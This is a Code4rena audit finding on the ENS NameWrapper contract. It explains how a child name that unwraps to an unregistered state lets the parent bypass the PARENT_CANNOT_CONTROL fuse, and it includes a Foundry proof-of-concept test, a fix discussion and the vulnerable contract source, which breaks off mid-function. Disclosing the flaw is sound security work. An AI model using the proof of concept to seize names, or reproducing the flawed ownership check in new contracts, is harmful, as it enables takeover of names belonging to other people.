{
  "Title": "[M-03] NameWrapper: Wrapped to Unregistered to ignore `PARENT_CANNOT_CONTROL`",
  "Content": "\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512><br>\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550>\n\n### Impact\n\n*   owner of a wrapped node without `CANNOT_UNWRAP` fuse can unwrap and set the `ens.owner(node)` to zero to be an unregistered state\n*   if it happens, even if the node has `PARENT_CANNOT_CONTROL` fuse, the parent of the node can change the `NameWrappwer.owner` of the node\n\n### Proof of Concept\n\nBelow is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.\n\nIn the proof of concept below, the parent node is `vitalik.eth` and the child node is `sub1.vitalik.eth`.<br>\nThe parent node has `PARENT_CANNOT_CONTROL`, `IS_DOT_ETH` and `CANNOT_UNWRAP` and the child node has `PARENT_CANNOT_CONTROL`.\n\nThe child node unwraps itself and set the owner on `ens` contract to the `address(0)` or `address(ens)`, which will make the child node to unregistered state even before expiry of the node.\n\nSince technically the child node is unregistered, the parent can now 'create' the 'unregistered' node `sub1.vitalik.eth` by simply calling `setSubnodeRecord`. By doing so, the parent can take control over the child node, even though the `PARENT_CANNOT_CONTROL` fuse was set and it was before expiry.\n\n```solidity\nfunction testM4WrappedToUnregistered() public {\nstring memory parent = 'vitalik.eth';\nstring memory sub1_full = 'sub1.vitalik.eth';\nstring memory sub1 = 'sub1';\n(, bytes32 parent_node) = parent.dnsEncodeName();\n(bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();\n\n// wrap parent and lock\nvm.prank(user1);\nregistrar.setApprovalForAll(address(nameWrapper), true);\nvm.prank(user1);\nnameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));\n// checks\n(address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));\nassertEq(owner, user1);\nassertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);\nassertEq(expiry, 2038123728);\n\n// subnode\nvm.prank(user1);\nnameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);\n(owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\nassertEq(owner, user2);\nassertEq(fuses, PARENT_CANNOT_CONTROL);\nassertEq(expiry, 1700000000);\n\n// parent cannot set record on the sub1\nvm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));\nvm.prank(user1);\nnameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);\n\n// parent: pcc cu\n// child: pcc\n\n// unwrap sub and set the ens owner to zero -> now parent can change owner\nvm.prank(user2);\nnameWrapper.unwrap(parent_node, _hashLabel(sub1), address(ens));\nassertEq(ens.owner(sub1_node), address(0));\n\n// sub node has PCC but parent can set owner, resolve and ttl\nvm.prank(user1);\nnameWrapper.setSubnodeRecord(parent_node, sub1, address(246), address(12345), 111111, 0, 0);\n(owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\nassertEq(owner, address(246));\nassertEq(fuses, PARENT_CANNOT_CONTROL);\nassertEq(expiry, 1700000000);\nassertEq(ens.resolver(sub1_node), address(12345));\nassertEq(ens.ttl(sub1_node), 111111);\n\n// can change fuse as the new owner of sub1\nvm.prank(address(246));\nnameWrapper.setFuses(sub1_node, uint16(CANNOT_UNWRAP));\n(owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\nassertEq(owner, address(246));\nassertEq(fuses, PARENT_CANNOT_CONTROL | CANNOT_UNWRAP);\nassertEq(expiry, 1700000000);\nassertEq(ens.resolver(sub1_node), address(12345));\nassertEq(ens.ttl(sub1_node), 111111);\n}\n```\n\nIt is unlikely that the child node will set the owner of the ENS Registry to zero. But hypothetically, the owner of the child node wanted to \"burn\" the subnode thinking that no one can use it until the expiry. In that case the owner of the parent node can just take over the child node.\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\nUnclear, but consider using `ENS.recordExists` instead of checking the `ENS.owner`.\n\n**[jefflau (ENS) confirmed](https://github.com/code-423n4/2022-11-ens-findings/issues/8)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/8#issuecomment-1340130127):**\n> The warden has shown how, after burning the `PARENT_CANNOT_CONTROL` fuse, by unregistering a node, it's possible for the Parent to control the node again.\n>\n> An invariant is broken, but this condition is reliant on the node owner for it to be possible.\n>\n> Because of this, I believe Medium Severity to be appropriate.\n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/8#issuecomment-1376890398):**\n> Fixed.\n>\n> If ens address was zero then earlier code bypassed check for `PARENT_CANNOT_CONTROL` and only checked `CANNOT_CREATE_SUBDOMAIN`\n>\n> ```\n> if (owner == address(0)) {\n>             (, uint32 fuses, ) = getData(uint256(node));\n>             if (fuses & CANNOT_CREATE_SUBDOMAIN != 0) {\n> \t\t\trevert OperationProhibited(subnode);\n>             }\n> \t\t\t...\n> ```\n>\n> With the updated code, all unexpired nodes will be checked for `PARENT_CANNOT_CONTROL` fuse\n>\n> ```\n> bool expired = subnodeExpiry < block.timestamp;\n>         if (\n>             expired && ...)\n> \t\t\t...\n> \t\t\t} else {\n>             if (subnodeFuses & PARENT_CANNOT_CONTROL != 0) {\n>                 revert OperationProhibited(subnode);\n>             }\n> ```\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2022-11-ens",
  "Code": [
    {
      "filename": "contracts/wrapper/NameWrapper.sol",
      "content": "//SPDX-License-Identifier: MIT\npragma solidity ~0.8.17;\n\nimport {ERC1155Fuse, IERC165} from \"./ERC1155Fuse.sol\";\nimport {Controllable} from \"./Controllable.sol\";\nimport {INameWrapper, CANNOT_UNWRAP, CANNOT_BURN_FUSES, CANNOT_TRANSFER, CANNOT_SET_RESOLVER, CANNOT_SET_TTL, CANNOT_CREATE_SUBDOMAIN, PARENT_CANNOT_CONTROL, CAN_DO_EVERYTHING, IS_DOT_ETH, PARENT_CONTROLLED_FUSES, USER_SETTABLE_FUSES} from \"./INameWrapper.sol\";\nimport {INameWrapperUpgrade} from \"./INameWrapperUpgrade.sol\";\nimport {IMetadataService} from \"./IMetadataService.sol\";\nimport {ENS} from \"../registry/ENS.sol\";\nimport {IBaseRegistrar} from \"../ethregistrar/IBaseRegistrar.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport {BytesUtils} from \"./BytesUtils.sol\";\nimport {ERC20Recoverable} from \"../utils/ERC20Recoverable.sol\";\n\nerror Unauthorised(bytes32 node, address addr);\nerror IncompatibleParent();\nerror IncorrectTokenType();\nerror LabelMismatch(bytes32 labelHash, bytes32 expectedLabelhash);\nerror LabelTooShort();\nerror LabelTooLong(string label);\nerror IncorrectTargetOwner(address owner);\nerror CannotUpgrade();\nerror OperationProhibited(bytes32 node);\n\ncontract NameWrapper is\n    Ownable,\n    ERC1155Fuse,\n    INameWrapper,\n    Controllable,\n    IERC721Receiver,\n    ERC20Recoverable\n{\n    using BytesUtils for bytes;\n\n    ENS public immutable override ens;\n    IBaseRegistrar public immutable override registrar;\n    IMetadataService public override metadataService;\n    mapping(bytes32 => bytes) public override names;\n    string public constant name = \"NameWrapper\";\n\n    uint64 private constant GRACE_PERIOD = 90 days;\n    bytes32 private constant ETH_NODE =\n        0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;\n    bytes32 private constant ETH_LABELHASH =\n        0x4f5b812789fc606be1b3b16908db13fc7a9adf7ca72641f84d75b47069d3d7f0;\n    bytes32 private constant ROOT_NODE =\n        0x0000000000000000000000000000000000000000000000000000000000000000;\n\n    INameWrapperUpgrade public upgradeContract;\n    uint64 private constant MAX_EXPIRY = type(uint64).max;\n\n    constructor(\n        ENS _ens,\n        IBaseRegistrar _registrar,\n        IMetadataService _metadataService\n    ) {\n        ens = _ens;\n        registrar = _registrar;\n        metadataService = _metadataService;\n\n        /* Burn PARENT_CANNOT_CONTROL and CANNOT_UNWRAP fuses for ROOT_NODE and ETH_NODE */\n\n        _setData(\n            uint256(ETH_NODE),\n            address(0),\n            uint32(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP),\n            MAX_EXPIRY\n        );\n        _setData(\n            uint256(ROOT_NODE),\n            address(0),\n            uint32(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP),\n            MAX_EXPIRY\n        );\n        names[ROOT_NODE] = \"\\x00\";\n        names[ETH_NODE] = \"\\x03eth\\x00\";\n    }\n\n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        virtual\n        override(ERC1155Fuse, IERC165)\n        returns (bool)\n    {\n        return\n            interfaceId == type(INameWrapper).interfaceId ||\n            interfaceId == type(IERC721Receiver).interfaceId ||\n            super.supportsInterface(interfaceId);\n    }\n\n    /* ERC1155 Fuse */\n\n    /**\n     * @notice Gets the owner of a name\n     * @param id Label as a string of the .eth domain to wrap\n     * @return owner The owner of the name\n     */\n\n    function ownerOf(uint256 id)\n        public\n        view\n        override(ERC1155Fuse, INameWrapper)\n        returns (address owner)\n    {\n        return super.ownerOf(id);\n    }\n\n    /**\n     * @notice Gets the data for a name\n     * @param id Namehash of the name\n     * @return owner Owner of the name\n     * @return fuses Fuses of the name\n     * @return expiry Expiry of the name\n     */\n\n    function getData(uint256 id)\n        public\n        view\n        override(ERC1155Fuse, INameWrapper)\n        returns (\n            address owner,\n            uint32 fuses,\n            uint64 expiry\n        )\n    {\n        (owner, fuses, expiry) = super.getData(id);\n\n        bytes32 labelhash = _getEthLabelhash(bytes32(id), fuses);\n        if (labelhash != bytes32(0)) {\n            expiry = uint64(registrar.nameExpires(uint256(labelhash))) + GRACE_PERIOD;\n        }\n\n        if (expiry < block.timestamp) {\n            if (fuses & PARENT_CANNOT_CONTROL == PARENT_CANNOT_CONTROL) {\n                owner = address(0);\n            }\n            fuses = 0;\n        }\n    }\n\n    /* Metadata service */\n\n    /**\n     * @notice Set the metadata service. Only the owner can do this\n     * @param _metadataService The new metadata service\n     */\n\n    function setMetadataService(IMetadataService _metadataService)\n        public\n        onlyOwner\n    {\n        metadataService = _metadataService;\n    }\n\n    /**\n     * @notice Get the metadata uri\n     * @param tokenId The id of the token\n     * @return string uri of the metadata service\n     */\n\n    function uri(uint256 tokenId) public view override returns (string memory) {\n        return metadataService.uri(tokenId);\n    }\n\n    /**\n     * @notice Set the address of the upgradeContract of the contract. only admin can do this\n     * @dev The default value of upgradeContract is the 0 address. Use the 0 address at any time\n     * to make the contract not upgradable.\n     * @param _upgradeAddress address of an upgraded contract\n     */\n\n    function setUpgradeContract(INameWrapperUpgrade _upgradeAddress)\n        public\n        onlyOwner\n    {\n        if (address(upgradeContract) != address(0)) {\n            registrar.setApprovalForAll(address(upgradeContract), false);\n            ens.setApprovalForAll(address(upgradeContract), false);\n        }\n\n        upgradeContract = _upgradeAddress;\n\n        if (address(upgradeContract) != address(0)) {\n            registrar.setApprovalForAll(address(upgradeContract), true);\n            ens.setApprovalForAll(address(upgradeContract), true);\n        }\n    }\n\n    /**\n     * @notice Checks if msg.sender is the owner or approved by the owner of a name\n     * @param node namehash of the name to check\n     */\n\n    modifier onlyTokenOwner(bytes32 node) {\n        if (!canModifyName(node, msg.sender)) {\n            revert Unauthorised(node, msg.sender);\n        }\n\n        _;\n    }\n\n    /**\n     * @notice Checks if owner or approved by owner\n     * @param node namehash of the name to check\n     * @param addr which address to check permissions for\n     * @return whether or not is owner or approved\n     */\n\n    function canModifyName(bytes32 node, address addr)\n        public\n        view\n        override\n        returns (bool)\n    {\n        (address owner, uint32 fuses, uint64 expiry) = getData(uint256(node));\n        return (owner == addr || isApprovedForAll(owner, addr)) && (fuses & IS_DOT_ETH == 0 || expiry - GRACE_PERIOD >= block.timestamp);\n    }\n\n    /**\n     * @notice Wraps a .eth domain, creating a new token and sending the original ERC721 token to this contract\n     * @dev Can be called by the owner of the name on the .eth registrar or an authorised caller on the registrar\n     * @param label Label as a string of the .eth domain to wrap\n     * @param wrappedOwner Owner of the name in this contract\n     * @param ownerControlledFuses Initial owner-controlled fuses to set\n     * @param resolver Resolver contract address\n     */\n\n    function wrapETH2LD(\n        string calldata label,\n        address wrappedOwner,\n        uint16 ownerControlledFuses,\n        address resolver\n    ) public override {\n        uint256 tokenId = uint256(keccak256(bytes(label)));\n        address registrant = registrar.ownerOf(tokenId);\n        if (\n            registrant != msg.sender &&\n            !registrar.isApprovedForAll(registrant, msg.sender)\n        ) {\n            revert Unauthorised(\n                _makeNode(ETH_NODE, bytes32(tokenId)),\n                msg.sender\n            );\n        }\n\n        // transfer the token from the user to this contract\n        registrar.transferFrom(registrant, address(this), tokenId);\n\n        // transfer the ens record back to the new owner (this contract)\n        registrar.reclaim(tokenId, address(this));\n\n        _wrapETH2LD(label, wrappedOwner, ownerControlledFuses, resolver);\n    }\n\n    /**\n     * @dev Registers a new .eth second-level domain and wraps it.\n     *      Only callable by authorised controllers.\n     * @param label The label to register (Eg, 'foo' for 'foo.eth').\n     * @param wrappedOwner The owner of the wrapped name.\n     * @param duration The duration, in seconds, to register the name for.\n     * @param resolver The resolver address to set on the ENS registry (optional).\n     * @param ownerControlledFuses Initial owner-controlled fuses to set\n     * @return registrarExpiry The expiry date of the new name on the .eth registrar, in seconds since the Unix epoch.\n     */\n\n    function registerAndWrapETH2LD(\n        string calldata label,\n        address wrappedOwner,\n        uint256 duration,\n        address resolver,\n        uint16 ownerControlledFuses\n    ) external override onlyController returns (uint256 registrarExpiry) {\n        uint256 tokenId = uint256(keccak256(bytes(label)));\n        registrarExpiry = registrar.register(tokenId, address(this), duration);\n        _wrapETH2LD(label, wrappedOwner, ownerControlledFuses, resolver);\n    }\n\n    /**\n     * @notice Renews a .eth second-level domain.\n     * @dev Only callable by authorised controllers.\n     * @param tokenId The hash of the label to register (eg, `keccak256('foo')`, for 'foo.eth').\n     * @param duration The number of seconds to renew the name for.\n     * @return expires The expiry date of the name on the .eth registrar, in seconds since the Unix epoch.\n     */\n\n    function renew(\n        uint256 tokenId,\n        uint256 duration\n    ) external override onlyController returns (uint256 expires) {\n        return registrar.renew(tokenId, duration);\n    }\n\n    /**\n     * @notice Wraps a non .eth domain, of any kind. Could be a DNSSEC name vitalik.xyz or a subdomain\n     * @dev Can be called by the owner in the registry or an authorised caller in the registry\n     * @param name The name to wrap, in DNS format\n     * @param wrappedOwner Owner of the name in this contract\n     * @param resolver Resolver contract\n     */\n\n    function wrap(\n        bytes calldata name,\n        address wrappedOwner,\n        address resolver\n    ) public override {\n        (bytes32 labelhash, uint256 offset) = name.readLabel(0);\n        bytes32 parentNode = name.namehash(offset);\n        bytes32 node = _makeNode(parentNode, labelhash);\n\n        names[node] = name;\n\n        if (parentNode == ETH_NODE) {\n            revert IncompatibleParent();\n        }\n\n        address owner = ens.owner(node);\n\n        if (owner != msg.sender && !ens.isApprovedForAll(owner, msg.sender)) {\n            revert Unauthorised(node, msg.sender);\n        }\n\n        if (resolver != address(0)) {\n            ens.setResolver(node, resolver);\n        }\n\n        ens.setOwner(node, address(this));\n\n        _wrap(node, name, wrappedOwner, 0, 0);\n    }\n\n    /**\n     * @notice Unwraps a .eth domain. e.g. vitalik.eth\n     * @dev Can be called by the owner in the wrapper or an authorised caller in the wrapper\n     * @param labelhash Labelhash of the .eth domain\n     * @param registrant Sets the owner in the .eth registrar to this address\n     * @param controller Sets the owner in the registry to this address\n     */\n\n    function unwrapETH2LD(\n        bytes32 labelhash,\n        address registrant,\n        address controller\n    ) public override onlyTokenOwner(_makeNode(ETH_NODE, labelhash)) {\n        if (registrant == address(this)) {\n            revert IncorrectTargetOwner(registrant);\n        }\n        _unwrap(_makeNode(ETH_NODE, labelhash), controller);\n        registrar.safeTransferFrom(\n            address(this),\n            registrant,\n            uint256(labelhash)\n        );\n    }\n\n    /**\n     * @notice Unwraps a non .eth domain, of any kind. Could be a DNSSEC name vitalik.xyz or a subdomain\n     * @dev Can be called by the owner in the wrapper or an authorised caller in the wrapper\n     * @param parentNode Parent namehash of the name e.g. vitalik.xyz would be namehash('xyz')\n     * @param labelhash Labelhash of the name, e.g. vitalik.xyz would be keccak256('vitalik')\n     * @param controller Sets the owner in the registry to this address\n     */\n\n    function unwrap(\n        bytes32 parentNode,\n        bytes32 labelhash,\n        address controller\n    ) public override onlyTokenOwner(_makeNode(parentNode, labelhash)) {\n        if (parentNode == ETH_NODE) {\n            revert IncompatibleParent();\n        }\n        if (controller == address(0x0) || controller == address(this)) {\n            revert IncorrectTargetOwner(controller);\n        }\n        _unwrap(_makeNode(parentNode, labelhash), controller);\n    }\n\n    /**\n     * @notice Sets fuses of a name\n     * @param node Namehash of the name\n     * @param ownerControlledFuses Owner-controlled fuses to burn\n     * @return New fuses\n     */\n\n    function setFuses(bytes32 node, uint16 ownerControlledFuses)\n        public\n        onlyTokenOwner(node)\n        operationAllowed(node, CANNOT_BURN_FUSES)\n        returns (uint32)\n    {\n        // owner protected by onlyTokenOwner\n        (address owner, uint32 oldFuses, uint64 expiry) = getData(\n            uint256(node)\n        );\n        _setFuses(node, owner, ownerControlledFuses | oldFuses, expiry);\n        return ownerControlledFuses;\n    }\n\n    /**\n     * @notice Upgrades a .eth wrapped domain by calling the wrapETH2LD function of the upgradeContract\n     *     and burning the token of this contract\n     * @dev Can be called by the owner of the name in this contract\n     * @param label Label as a string of the .eth name to upgrade\n     * @param wrappedOwner The owner of the wrapped name\n     */\n\n    function upgradeETH2LD(\n        string calldata label,\n        address wrappedOwner,\n        address resolver\n    ) public {\n        bytes32 labelhash = keccak256(bytes(label));\n        bytes32 node = _makeNode(ETH_NODE, labelhash);\n        (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);\n\n        upgradeContract.wrapETH2LD(\n            label,\n            wrappedOwner,\n            fuses,\n            expiry,\n            resolver\n        );\n    }\n\n    /**\n     * @notice Upgrades a non .eth domain of any kind. Could be a DNSSEC name vitalik.xyz or a subdomain\n     * @dev Can be called by the owner or an authorised caller\n     * Requires upgraded Namewrapper to permit old Namewrapper to call `setSubnodeRecord` for all names\n     * @param parentNode Namehash of the parent name\n     * @param label Label as a string of the name to upgrade\n     * @param wrappedOwner Owner of the name in this contract\n     * @param resolver Resolver contract for this name\n     */\n\n    function upgrade(\n        bytes32 parentNode,\n        string calldata label,\n        address wrappedOwner,\n        address resolver\n    ) public {\n        bytes32 labelhash = keccak256(bytes(label));\n        bytes32 node = _makeNode(parentNode, labelhash);\n        (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);\n        upgradeContract.setSubnodeRecord(\n            parentNode,\n            label,\n            wrappedOwner,\n            resolver,\n            0,\n            fuses,\n            expiry\n        );\n    }\n\n    /** \n    /* @notice Sets fuses of a name that you own the parent of. Can also be called by the owner of a .eth name\n     * @param parentNode Parent namehash of the name e.g. vitalik.xyz would be namehash('xyz')\n     * @param labelhash Labelhash of the name, e.g. vitalik.xyz would be keccak256('vitalik')\n     * @param fuses Fuses to burn\n     * @param expiry When the name will expire in seconds since the Unix epoch\n     */\n\n    function setChildFuses(\n        bytes32 parentNode,\n        bytes32 labelhash,\n        uint32 fuses,\n        uint64 expiry\n    ) public {\n        bytes32 node = _makeNode(parentNode, labelhash);\n        _checkFusesAreSettable(node, fuses);\n        (address owner, uint32 oldFuses, uint64 oldExpiry) = getData(uint256(node));\n        // max expiry is set to the expiry of the parent\n        (, uint32 parentFuses, uint64 maxExpiry) = getData(\n            uint256(parentNode)\n        );\n        if (parentNode == ROOT_NODE) {\n            if (!canModifyName(node, msg.sender)) {\n                revert Unauthorised(node, msg.sender);\n            }\n        } else {\n            if (!canModifyName(parentNode, msg.sender)) {\n                revert Unauthorised(node, msg.sender);\n            }\n        }\n\n        _checkParentFuses(node, fuses, parentFuses);\n\n        expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);\n\n        // if PARENT_CANNOT_CONTROL has been burned and fuses have changed\n        if (\n            oldFuses & PARENT_CANNOT_CONTROL != 0 &&\n            oldFuses | fuses != oldFuses\n        ) {\n            revert OperationProhibited(node);\n        }\n        fuses |= oldFuses;\n        _setFuses(node, owner, fuses, expiry);\n    }\n\n    /**\n     * @notice Sets the subdomain owner in the registry and then wraps the subdomain\n     * @param parentNode Parent namehash of the subdomain\n     * @param label Label of the subdomain as a string\n     * @param owner New owner in the wrapper\n     * @param fuses Initial fuses for the wrapped subdomain\n     * @param expiry When the name will expire in seconds since the Unix epoch\n     * @return node Namehash of the subdomain\n     */\n\n    function setSubnodeOwner(\n        bytes32 parentNode,\n        string calldata label,\n        address owner,\n        uint32 fuses,\n        uint64 expiry\n    )\n        public\n        onlyTokenOwner(parentNode)\n        canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))\n        returns (bytes32 node)\n    {\n        bytes32 labelhash = keccak256(bytes(label));\n        node = _makeNode(parentNode, labelhash);\n        _checkFusesAreSettable(node, fuses);\n        bytes memory name = _saveLabel(parentNode, node, label);\n        expiry = _checkParentFusesAndExpiry(parentNode, node, fuses, expiry);\n\n        if (ownerOf(uint256(node)) == address(0)) {\n            ens.setSubnodeOwner(parentNode, labelhash, address(this));\n            _wrap(node, name, owner, fuses, expiry);\n        } else {\n            _updateName(parentNode, node, label, owner, fuses, expiry);\n        }\n    }\n\n    /**\n     * @notice Sets the subdomain owner in the registry with records and then wraps the subdomain\n     * @param parentNode parent namehash of the subdomain\n     * @param label label of the subdomain as a string\n     * @param owner new owner in the wrapper\n     * @param resolver resolver contract in the registry\n     * @param ttl ttl in the regsitry\n     * @param fuses initial fuses for the wrapped subdomain\n     * @param expiry When the name will expire in seconds since the Unix epoch\n     * @return node Namehash of the subdomain\n     */\n\n    function setSubnodeRecord(\n        bytes32 parentNode,\n        string memory label,\n        address owner,\n        address resolver,\n        uint64 ttl,\n        uint32 fuses,\n        uint64 expiry\n    )\n        public\n        onlyTokenOwner(parentNode)\n        canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))\n        returns (bytes32 node)\n    {\n        bytes32 labelhash = keccak256(bytes(label));\n        node = _makeNode(parentNode, labelhash);\n        _checkFusesAreSettable(node, fuses);\n        _saveLabel(parentNode, node, label);\n        expiry = _checkParentFusesAndExpiry(parentNode, node, fuses, expiry);\n        if (ownerOf(uint256(node)) == address(0)) {\n            ens.setSubnodeRecord(\n                parentNode,\n                labelhash,\n                address(this),\n                resolver,\n                ttl\n            );\n            _storeNameAndWrap(parentNode, node, label, owner, fuses, expiry);\n        } else {\n            ens.setSubnodeRecord(\n                parentNode,\n                labelhash,\n                address(this),\n                resolver,\n                ttl\n            );\n            _updateName(parentNode, node, label, owner, fuses, expiry);\n        }\n    }\n\n    /**\n     * @notice Sets records for the name in the ENS Registry\n     * @param node Namehash of the name to set a record for\n     * @param owner New owner in the registry\n     * @param resolver Resolver contract\n     * @param ttl Time to live in the registry\n     */\n\n    function setRecord(\n        bytes32 node,\n        address owner,\n        address resolver,\n        uint64 ttl\n    )\n        public\n        override\n        onlyTokenOwner(node)\n        operationAllowed(\n            node,\n            CANNOT_TRANSFER | CANNOT_SET_RESOLVER | CANNOT_SET_TTL\n        )\n    {\n        ens.setRecord(node, address(this), resolver, ttl);\n        if (owner == address(0)) {\n            (, uint32 fuses, ) = getData(uint256(node));\n            if (fuses & IS_DOT_ETH == IS_DOT_ETH) {\n                revert IncorrectTargetOwner(owner);\n            }\n            _unwrap(node, address(0));\n        } else {\n            address oldOwner = ownerOf(uint256(node));\n            _transfer(oldOwner, owner, uint256(node), 1, \"\");\n        }\n    }\n\n    /**\n     * @notice Sets resolver contract in the registry\n     * @param node namehash of the name\n     * @param resolver the resolver contract\n     */\n\n    function setResolver(bytes32 node, address resolver)\n        public\n        override\n        onlyTokenOwner(node)\n        operationAllowed(node, CANNOT_SET_RESOLVER)\n    {\n        ens.setResolver(node, resolver);\n    }\n\n    /**\n     * @notice Sets TTL in the registry\n     * @param node Namehash of the name\n     * @param ttl TTL in the registry\n     */\n\n    function setTTL(bytes32 node, uint64 ttl)\n        public\n        override\n        onlyTokenOwner(node)\n        operationAllowed(node, CANNOT_SET_TTL)\n    {\n        ens.setTTL(node, ttl);\n    }\n\n    /**\n     * @dev Allows an operation only if none of the specified fuses are burned.\n     * @param node The namehash of the name to check fuses on.\n     * @param fuseMask A bitmask of fuses that must not be burned.\n     */\n\n    modifier operationAllowed(bytes32 node, uint32 fuseMask) {\n        (, uint32 fuses, ) = getData(uint256(node));\n        if (fuses & fuseMask != 0) {\n            revert OperationProhibited(node);\n        }\n        _;\n    }\n\n    /**\n     * @notice Check whether a name can call setSubnodeOwner/setSubnodeRecord\n     * @dev Checks both CANNOT_CREATE_SUBDOMAIN and PARENT_CANNOT_CONTROL and whether not they have been burnt\n     *      and checks whether the owner of the subdomain is 0x0 for creating or already exists for\n     *      replacing a subdomain. If either conditions are true, then it is possible to call\n     *      setSubnodeOwner\n     * @param node Namehash of the name to check\n     * @param labelhash Labelhash of the name to check\n     */\n\n    modifier canCallSetSubnodeOwner(bytes32 node, bytes32 labelhash) {\n        bytes32 subnode = _makeNode(node, labelhash);\n        address owner = ens.owner(subnode);\n\n        if (owner == address(0)) {\n            (, uint32 fuses, ) = getData(uint256(node));\n            if (fuses & CANNOT_CREATE_SUBDOMAIN != 0) {\n                revert OperationProhibited(subnode);\n            }\n        } else {\n            (, uint32 subnodeFuses, ) = getData(uint256(subnode));\n            if (subnodeFuses & PARENT_CANNOT_CONTROL != 0) {\n                revert OperationProhibited(subnode);\n            }\n        }\n\n        _;\n    }\n\n    /**\n     * @notice Checks all Fuses in the mask are burned for the node\n     * @param node Namehash of the name\n     * @param fuseMask The fuses you want to check\n     * @return Boolean of whether or not all the selected fuses are burned\n     */\n\n    function allFusesBurned(bytes32 node, uint32 fuseMask)\n        public\n        view\n        override\n        returns (bool)\n    {\n        (, uint32 fuses, ) = getData(uint256(node));\n        return fuses & fuseMask == fuseMask;\n    }\n\n    function onERC721Received(\n        address to,\n        address,\n        uint256 tokenId,\n        bytes calldata data\n    ) public override returns (bytes4) {\n        //check if it's the eth registrar ERC721\n        if (msg.sender != address(registrar)) {\n            revert IncorrectTokenType();\n        }\n\n        (\n            string memory label,\n            address owner,\n            uint16 ownerControlledFuses,\n            address resolver\n        ) = abi.decode(data, (string, address, uint16, address));\n\n        bytes32 labelhash = bytes32(tokenId);\n        bytes32 labelhashFromData = keccak256(bytes(label));\n\n        if (labelhashFromData != labelhash) {\n            revert LabelMismatch(labelhashFromData, labelhash);\n        }\n\n        // transfer the ens record back to the new owner (this contract)\n        registrar.reclaim(uint256(labelhash), address(this));\n\n        _wrapETH2LD(label, owner, ownerControlledFuses, resolver);\n\n        return IERC721Receiver(to).onERC721Received.selector;\n    }\n\n    /***** Internal functions */\n\n    function _preTransferCheck(uint256 id, uint32 fuses, uint64 expiry) internal view override returns (bool) {\n        // For this check, treat .eth 2LDs as expiring at the start of the grace period.\n        if(fuses & IS_DOT_ETH == IS_DOT_ETH) {\n            expiry -= GRACE_PERIOD;\n        }\n\n        if(expiry < block.timestamp) {\n            // Transferable if the name was not emancipated\n            if(fuses & PARENT_CANNOT_CONTROL != 0) {\n                revert(\"ERC1155: insufficient balance for transfer\");\n            }\n        } else {\n            // Transferable if CANNOT_TRANSFER is unburned\n            if(fuses & CANNOT_TRANSFER != 0) {\n                revert OperationProhibited(bytes32(id));\n            }\n        }\n    }\n\n    function _makeNode(bytes32 node, bytes32 labelhash)\n        private\n        pure\n        returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(node, labelhash));\n    }\n\n    function _addLabel(string memory label, bytes memory name)\n        internal\n        pure\n        returns (bytes memory ret)\n    {\n        if (bytes(label).length < 1) {\n            revert LabelTooShort();\n        }\n        if (bytes(label).length > 255) {\n            revert LabelTooLong(label);\n        }\n        return abi.encodePacked(uint8(bytes(label).length), label, name);\n    }\n\n    function _mint(\n        bytes32 node,\n        address owner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal override {\n        _canFusesBeBurned(node, fuses);\n        address oldOwner = ownerOf(uint256(node));\n        if (oldOwner != address(0)) {\n            // burn and unwrap old token of old owner\n            _burn(uint256(node));\n            emit NameUnwrapped(node, address(0));\n        }\n        super._mint(node, owner, fuses, expiry);\n    }\n\n    function _wrap(\n        bytes32 node,\n        bytes memory name,\n        address wrappedOwner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        _mint(node, wrappedOwner, fuses, expiry);\n        emit NameWrapped(node, name, wrappedOwner, fuses, expiry);\n    }\n\n    function _storeNameAndWrap(\n        bytes32 parentNode,\n        bytes32 node,\n        string memory label,\n        address owner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        bytes memory name = _addLabel(label, names[parentNode]);\n        _wrap(node, name, owner, fuses, expiry);\n    }\n\n    function _saveLabel(\n        bytes32 parentNode,\n        bytes32 node,\n        string memory label\n    ) internal returns (bytes memory) {\n        bytes memory name = _addLabel(label, names[parentNode]);\n        names[node] = name;\n        return name;\n    }\n\n    function _prepareUpgrade(bytes32 node)\n        private\n        returns (uint32 fuses, uint64 expiry)\n    {\n        if (address(upgradeContract) == address(0)) {\n            revert CannotUpgrade();\n        }\n\n        if (!canModifyName(node, msg.sender)) {\n            revert Unauthorised(node, msg.sender);\n        }\n\n        (, fuses, 